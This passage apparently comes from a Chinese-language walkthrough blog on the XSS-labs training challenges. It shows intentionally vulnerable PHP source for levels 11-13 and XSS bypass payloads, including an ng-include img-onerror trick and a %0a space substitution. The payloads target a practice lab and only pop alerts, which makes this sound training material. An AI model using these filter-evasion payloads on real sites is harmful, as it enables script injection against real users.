punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level11<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str00</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"t_sort\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str11</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_REFERER'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  è·å–refererèµ‹å€¼ç»™<span class=\"token variable\">$str11</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str22</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">></span>æ›¿æ¢ä¸ºç©º</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str33</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> èµ‹å€¼ç»™<span class=\"token variable\">$str33</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;form id=search></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;input name=\"t_link\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=\"t_history\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=\"t_sort\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str00</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input name=\"t_ref\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str33</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"> value=$str33</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level11.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h4 id=\"ç¬¬åäºŒå…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬åäºŒå…³\">#</a> <span class=\"label\">ç¬¬åäºŒå…³</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level13.php?keyword=good job!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level12<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level12<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str00</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"t_sort\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str11</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_USER_AGENT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> è¿™æ¬¡è·å–çš„<span class=\"token constant\">UA</span>å¤´å†…å®¹</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str22</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str33</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;form id=search></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;input name=\"t_link\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=\"t_history\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=\"t_sort\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str00</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input name=\"t_ua\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str33</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level12.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>è¿™æ¬¡è·å–çš„ UA å¤´å†…å®¹å…¶ä»–è·Ÿä¸Šå…³ä¸€æ ·æ”¹ä¸€ä¸‹å°±è¡Œäº†</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/37.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/38.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬åä¸‰å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬åä¸‰å…³\">#</a> <span class=\"label\">ç¬¬åä¸‰å…³</span></h4>\n<p>è¿™æ¬¡è·å–çš„ cookie å…¶ä»–è·Ÿä¸Šå…³ä¸€æ ·æ”¹ä¸€ä¸‹å°±è¡Œäº†</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level14.php\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level13<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level13<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"call me maybe?\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str00</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"t_sort\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str11</span><span class=\"token operator\">=</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str22</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str33</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;form id=search></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=\"t_link\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=\"t_history\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input name=\"t_sort\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str00</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;input name=\"t_cook\"  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str33</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" type=\"hidden\"></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level13.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/39.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬åäº”å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬åäº”å…³\">#</a> <span class=\"label\">ç¬¬åäº”å…³</span></h4>\n<p>f12 çœ‹åˆ° ngInclude: undefined æœªå®šä¹‰</p>\n<p>å®šä¹‰å’Œç”¨æ³•</p>\n<p>ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p>\n<p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p>\n<p>ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p>\n<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚</p>\n<p>ç”¨ä»–å»åŒ…å«ç¬¬ä¸€å…³</p>\n<p>src=â€˜level1.php?name=<img onerror=alert(3)>â€™</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/40.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬åå…­å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬åå…­å…³\">#</a> <span class=\"label\">ç¬¬åå…­å…³</span></h4>\n<p>script å’Œ / ç©ºæ ¼æ²¡äº†</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/41.png\" alt=\"\"></p>\n<p><code>htmlä¸­æ˜¯å¯ä»¥å°†%0aå’Œ%0dä½œä¸ºç©ºæ ¼ä½¿ç”¨çš„</code></p>\n<p><code>&lt;a%0adonmouseover='alert(1)'&gt;</code></p>\n<p><code>åˆ’è¿‡è§¦å‘çš„äº‹ä»¶*onmouseover*</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/42.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬åä¸ƒå…³\"><a class=\"markdownIt-Anchor\" 